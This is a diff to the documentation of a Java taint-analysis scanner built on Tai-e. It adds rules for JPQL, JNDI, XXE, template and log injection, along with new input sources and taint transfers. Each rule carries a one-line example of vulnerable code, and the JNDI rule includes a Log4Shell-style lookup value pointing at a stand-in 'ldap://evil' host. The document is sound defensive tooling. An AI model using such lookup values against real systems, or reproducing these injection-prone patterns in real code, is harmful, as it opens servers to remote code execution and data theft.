@@ -9,13 +9,15 @@ sanitizers are concrete library methods, configurable in
 
 External input is taint. Recognized entry points:
 
-| Framework | Annotations |
+| Framework | Annotations / methods |
 |---|---|
-| Spring MVC / WebFlux | `@RequestParam`, `@PathVariable`, `@RequestBody`, `@RequestHeader`, `@CookieValue`, `@ModelAttribute` |
+| Spring MVC / WebFlux | `@RequestParam`, `@PathVariable`, `@RequestBody`, `@RequestHeader`, `@CookieValue`, `@ModelAttribute`, `@MatrixVariable`, `@RequestPart` |
 | Spring Kafka | `@KafkaListener` (payload) |
 | JAX-RS / Quarkus | `@QueryParam`, `@PathParam`, `@HeaderParam`, `@FormParam`, `@CookieParam` |
 | Micronaut | `@QueryValue`, `@PathVariable`, `@Body`, `@Header` |
-| Servlet | `HttpServletRequest.getParameter/getHeader/getQueryString` |
+| Servlet | `HttpServletRequest.getParameter/getHeader/getQueryString`, `ServletRequest/HttpSession.getAttribute` |
+| File upload | `MultipartFile.getOriginalFilename/getInputStream/getContentType` |
+| Batch | `ItemReader.read` (external CSV/XML/DB data) |
 | Persistence | `@Repository` read methods returning `String` (`find*`/`get*`/`read*`/...) |
 
 **Stored / second-order injection.** Data returned by a `@Repository` read method
@@ -34,6 +36,14 @@ Untrusted data concatenated into SQL.
 - **Sinks:** `JdbcTemplate.query/update/execute`, `java.sql.Statement.execute/executeQuery`, `EntityManager.createNativeQuery`, R2DBC `DatabaseClient.sql`
 - **Sanitizers:** parameterized queries (`NamedParameterJdbcTemplate`, bound `?` parameters) — modelled as not-a-sink
 - **Example:** `jdbc.query("… WHERE name = '" + name + "'", mapper)`
+
+## `jpql-injection` — CWE-89 (critical)
+
+Untrusted data concatenated into a JPQL query. Using JPA does **not** make a
+string-built query safe.
+
+- **Sinks:** `EntityManager.createQuery(String)`
+- **Example:** `em.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")`
 
 ## `xss` — CWE-79 (high)
 
@@ -75,8 +85,46 @@ Untrusted data passed to an OS command.
 
 A user-controlled URL is used as a redirect target.
 
-- **Sinks:** `HttpServletResponse.sendRedirect`
-- **Example:** `response.sendRedirect(url)`
+- **Sinks:** `HttpServletResponse.sendRedirect`, Spring MVC `ModelAndView.setViewName` (`"redirect:" + url`)
+- **Example:** `mv.setViewName("redirect:" + returnUrl)`
+
+## `jndi-injection` — CWE-74 (critical)
+
+A user-controlled name reaches a JNDI lookup, which can load and run remote code —
+the mechanism behind Log4Shell (CVE-2021-44228).
+
+- **Sinks:** `Context.lookup`, `InitialContext.lookup`, `InitialDirContext.lookup`
+- **Example:** `new InitialContext().lookup(name)  // name = "ldap://evil/x"`
+
+## `xxe` — CWE-611 (high)
+
+External input reaches an XML parser that has not been hardened against external
+entities (which can read local files or make server-side requests). The first
+version reports any external input reaching `parse`; analysis of the parser's
+hardening flags is not yet done, so treat findings as "review the parser config".
+
+- **Sinks:** `DocumentBuilder.parse(String|InputStream|InputSource)`
+- **Example:** `documentBuilder.parse(userUri)`
+
+## `template-injection` — CWE-1336 (critical)
+
+A user-controlled template name or body is processed by a template engine, allowing
+server-side template injection (often RCE).
+
+- **Sinks:** Thymeleaf `ITemplateEngine.process`, FreeMarker `Configuration.getTemplate`
+- **Example:** `templateEngine.process(userPage, context)`
+
+## `log-injection` — CWE-117 (low)
+
+Untrusted data concatenated into a log message can forge log entries (CRLF),
+corrupting audit trails. Low severity, but a real integrity issue under PCI-DSS/SOX.
+
+- **Sinks:** the single-argument `org.slf4j.Logger.info/warn/error/debug(String)`
+  overloads (the parameterized `"{}"` form is a weaker vector and is not modelled)
+- **Example:** `log.info("Login for: " + username)`
+- **Note:** logging frameworks log user data internally (e.g. `JdbcTemplate` logs
+  the SQL it runs), so sinks reached *inside* the logging facade or other library
+  packages are filtered out — only log calls written in application code are reported.
 
 ---
 
@@ -96,11 +144,30 @@ run the taint engine).
 
 ---
 
+## Taint transfers
+
+Taint propagates through method calls via **transfers** (`from` → `to`). Tai-e
+bundles ~138 transfers for `String`/`StringBuilder` (concatenation, `substring`,
+`trim`, …), which are always loaded. On top of those, the default config adds
+transparent wrappers common in modern Spring code:
+
+- `Optional` — `of`/`ofNullable` (arg → wrapper) and `get`/`orElse` (wrapper → out);
+- `CompletableFuture` — `completedFuture` and `get`/`join`;
+- Reactor `Mono`/`Flux` `just`, and `Collectors.joining` (best-effort).
+
+The unwrap methods return `Object` and are immediately cast in real code
+(`Optional<String>` → `String`). Tai-e type-filters at the cast, so the unwrap
+transfers declare `type: java.lang.String` to keep the taint flowing across it —
+the dominant case, since injection payloads are strings. Operators that take a
+lambda (`Mono.map`, `Stream.map`) depend on Tai-e's partial lambda support and are
+not relied upon.
+
 ## Extending
 
 Add your own sources, sinks, sanitizers and transfers in Tai-e's YAML format and
-pass them with `--config`. Sinks declared on interface library types (no concrete
-implementation on the classpath) are matched via Tai-e `call-site-mode`.
+pass them with `--config` (merged onto the defaults; `--no-default-config` to
+replace). Sinks declared on interface library types (no concrete implementation on
+the classpath) are matched via Tai-e `call-site-mode`.
 
 ## Known limitations
 
